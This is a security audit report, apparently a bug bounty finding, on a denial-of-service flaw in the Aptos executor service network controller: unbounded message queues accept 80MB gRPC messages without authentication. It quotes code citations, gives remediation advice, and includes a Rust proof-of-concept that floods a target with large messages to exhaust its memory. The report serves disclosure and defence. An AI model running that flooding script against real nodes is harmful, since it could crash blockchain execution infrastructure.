# Audit Report

## Title
Unbounded Memory Consumption via Malicious Messages in Executor Service Network Controller

## Summary
The `NetworkController` in the secure/net module uses unbounded channels to queue incoming messages from remote peers, while individual messages can be up to 80MB. An attacker can exploit this by flooding the service with large messages faster than they can be processed, causing unbounded memory consumption and eventual Out-of-Memory (OOM) crash of the executor service.

## Finding Description

The vulnerability exists in the message handling pipeline of the `NetworkController` used by the executor service for remote execution and cross-shard communication.

The `Message` struct contains an unbounded `Vec<u8>` data field: [1](#0-0) 

While the gRPC layer enforces a maximum message size of 80MB: [2](#0-1) 

The critical vulnerability lies in the use of **unbounded channels** to queue these messages. When creating inbound channels, the code uses `crossbeam_channel::unbounded()`: [3](#0-2) 

Similarly, outbound channels are unbounded: [4](#0-3) 

When messages arrive from remote peers via gRPC, they are immediately sent to the unbounded channel **without any authentication, rate limiting, or backpressure mechanism**: [5](#0-4) 

The executor service uses this NetworkController for critical operations including cross-shard communication and coordinator-shard messaging: [6](#0-5) 

**Attack Path:**
1. Attacker establishes gRPC connection to an executor service (coordinator or shard)
2. No authentication is required - the service accepts messages from any remote address
3. Attacker sends N messages rapidly, each up to 80MB (within gRPC limit)
4. Each message is queued in the unbounded channel via `handler.send(msg).unwrap()`
5. If the consumer processes messages slower than the attacker sends them, the queue grows indefinitely
6. Memory consumption = N Ã— 80MB (can easily reach gigabytes)
7. Eventually causes OOM error and executor service crash

**Broken Invariant:**
This violates **Invariant #9**: "Resource Limits: All operations must respect gas, storage, and computational limits." The system fails to enforce memory limits on incoming network messages.

## Impact Explanation

This vulnerability qualifies as **HIGH severity** under the Aptos bug bounty program for the following reasons:

1. **"Validator node slowdowns"** - As memory consumption increases, the node experiences performance degradation from memory pressure, garbage collection overhead, and swapping.

2. **"API crashes"** - When memory is exhausted, the executor service process crashes with OOM error, terminating the remote execution infrastructure.

3. **Potential "Total loss of liveness"** - If the executor service is critical to block execution (in a sharded execution deployment), crashing multiple shards could halt block production entirely, requiring manual intervention.

The impact is severe because:
- The executor service handles critical block execution logic
- Cross-shard communication is essential for sharded execution
- A crashed executor service disrupts the entire execution pipeline
- The attack requires minimal resources (just network connectivity)
- No authentication or authorization prevents the attack

## Likelihood Explanation

**Likelihood: Medium to High**

**Factors increasing likelihood:**
- **No authentication required** - Any peer that can reach the network endpoint can send messages
- **Simple exploit** - Attacker only needs a gRPC client sending large messages
- **Low attacker cost** - Sending messages is computationally cheap
- **High impact** - Crashing executor services disrupts block execution

**Factors potentially reducing likelihood:**
- Executor services may be deployed on internal networks with firewall protection
- Network segmentation might limit attacker access
- HAProxy or load balancers might provide connection limits (but code shows no such protection)

However, the **code itself has no protections**, making it exploitable whenever network access is available. The executor service listens on configurable socket addresses without any access controls: [7](#0-6) 

## Recommendation

Implement multiple defense layers:

**1. Bounded Channels:**
Replace unbounded channels with bounded channels that provide backpressure:

```rust
// In create_inbound_channel
const MAX_INBOUND_QUEUE_SIZE: usize = 100; // or configuration-based
let (inbound_sender, inbound_receiver) = bounded(MAX_INBOUND_QUEUE_SIZE);
```

**2. Concurrent Request Limits:**
Add semaphore-based concurrency control similar to the network framework: [8](#0-7) 

**3. Rate Limiting:**
Implement per-peer rate limiting to prevent message flooding.

**4. Authentication:**
Add mutual TLS (mTLS) or token-based authentication to verify peer identity before accepting messages.

**5. Message Size Validation:**
While gRPC enforces 80MB, consider if this is appropriate. The network framework uses 64MB: [9](#0-8) 

**Minimal Fix Example:**
```rust
use crossbeam_channel::bounded;

const MAX_CHANNEL_SIZE: usize = 100;

pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
    let (inbound_sender, inbound_receiver) = bounded(MAX_CHANNEL_SIZE);
    
    self.inbound_handler
        .lock()
        .unwrap()
        .register_handler(message_type, inbound_sender);
    
    inbound_receiver
}
```

When the channel is full, `send()` will block or return an error, providing natural backpressure.

## Proof of Concept

```rust
// PoC: Malicious client flooding the executor service with large messages
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use tokio::runtime::Runtime;
use std::net::SocketAddr;

#[tokio::main]
async fn main() {
    // Target executor service address (replace with actual address)
    let target_addr = "127.0.0.1:50051";
    let target_url = format!("http://{}", target_addr);
    
    // Connect to target (no authentication required)
    let mut client = NetworkMessageServiceClient::connect(target_url)
        .await
        .expect("Failed to connect");
    
    println!("Connected to target, starting memory exhaustion attack...");
    
    // Create 80MB message (maximum allowed by gRPC)
    let large_message = vec![0u8; 80 * 1024 * 1024];
    
    // Send messages in rapid succession
    for i in 0..1000 {
        let request = tonic::Request::new(NetworkMessage {
            message: large_message.clone(),
            message_type: "execute_command_0".to_string(), // Valid message type
        });
        
        match client.simple_msg_exchange(request).await {
            Ok(_) => {
                println!("Sent message {} (80MB)", i);
                // No delay - send as fast as possible to outpace processing
            },
            Err(e) => {
                println!("Failed to send message {}: {}", i, e);
                break;
            }
        }
    }
    
    println!("Attack complete. Target memory consumption: ~80GB");
    println!("Monitor target process for OOM or extreme memory usage.");
}
```

**Expected Result:**
- Target executor service memory usage increases by ~80MB per message
- With 1000 messages, memory consumption reaches ~80GB
- Target process either crashes with OOM or becomes unresponsive
- No authentication prevents the attack
- No rate limiting slows the attack
- Unbounded channels queue all messages without backpressure

**To test safely:**
1. Deploy an isolated executor service instance
2. Run the PoC against it
3. Monitor memory usage with `top` or similar tools
4. Observe memory growth and eventual crash/degradation

## Notes

This vulnerability is particularly concerning because:

1. **Critical Infrastructure** - The executor service is essential for block execution in sharded deployments
2. **No Defense-in-Depth** - Multiple protective layers are missing (auth, rate limiting, bounded channels)
3. **Easy Exploitation** - Requires only network access and a simple gRPC client
4. **Cascading Failures** - Crashing one shard can disrupt the entire execution pipeline

The secure/net module appears designed for trusted internal communication but lacks the security controls necessary when exposed to potentially hostile networks.

### Citations

**File:** secure/net/src/network_controller/mod.rs (L56-60)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
#[allow(dead_code)]
pub struct Message {
    pub data: Vec<u8>,
}
```

**File:** secure/net/src/network_controller/mod.rs (L115-126)
```rust
    pub fn create_outbound_channel(
        &mut self,
        remote_peer_addr: SocketAddr,
        message_type: String,
    ) -> Sender<Message> {
        let (outbound_sender, outbound_receiver) = unbounded();

        self.outbound_handler
            .register_handler(message_type, remote_peer_addr, outbound_receiver);

        outbound_sender
    }
```

**File:** secure/net/src/network_controller/mod.rs (L128-137)
```rust
    pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
        let (inbound_sender, inbound_receiver) = unbounded();

        self.inbound_handler
            .lock()
            .unwrap()
            .register_handler(message_type, inbound_sender);

        inbound_receiver
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L23-23)
```rust
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80;
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-116)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
}
```

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L14-47)
```rust
pub struct RemoteCrossShardClient {
    // The senders of cross-shard messages to other shards per round.
    message_txs: Arc<Vec<Vec<Mutex<Sender<Message>>>>>,
    // The receivers of cross shard messages from other shards per round.
    message_rxs: Arc<Vec<Mutex<Receiver<Message>>>>,
}

impl RemoteCrossShardClient {
    pub fn new(controller: &mut NetworkController, shard_addresses: Vec<SocketAddr>) -> Self {
        let mut message_txs = vec![];
        let mut message_rxs = vec![];
        // Create outbound channels for each shard per round.
        for remote_address in shard_addresses.iter() {
            let mut txs = vec![];
            for round in 0..MAX_ALLOWED_PARTITIONING_ROUNDS {
                let message_type = format!("cross_shard_{}", round);
                let tx = controller.create_outbound_channel(*remote_address, message_type);
                txs.push(Mutex::new(tx));
            }
            message_txs.push(txs);
        }

        // Create inbound channels for each round
        for round in 0..MAX_ALLOWED_PARTITIONING_ROUNDS {
            let message_type = format!("cross_shard_{}", round);
            let rx = controller.create_inbound_channel(message_type);
            message_rxs.push(Mutex::new(rx));
        }

        Self {
            message_txs: Arc::new(message_txs),
            message_rxs: Arc::new(message_rxs),
        }
    }
```

**File:** execution/executor-service/src/main.rs (L9-25)
```rust
#[derive(Debug, Parser)]
struct Args {
    #[clap(long, default_value_t = 8)]
    pub num_executor_threads: usize,

    #[clap(long)]
    pub shard_id: usize,

    #[clap(long)]
    pub num_shards: usize,

    #[clap(long, num_args = 1..)]
    pub remote_executor_addresses: Vec<SocketAddr>,

    #[clap(long)]
    pub coordinator_address: SocketAddr,
}
```

**File:** network/framework/src/constants.rs (L14-15)
```rust
/// Limit on concurrent Inbound RPC requests before backpressure is applied
pub const MAX_CONCURRENT_INBOUND_RPCS: u32 = 100;
```

**File:** network/framework/src/constants.rs (L21-21)
```rust
pub const MAX_MESSAGE_SIZE: usize = 64 * 1024 * 1024; /* 64 MiB */
```
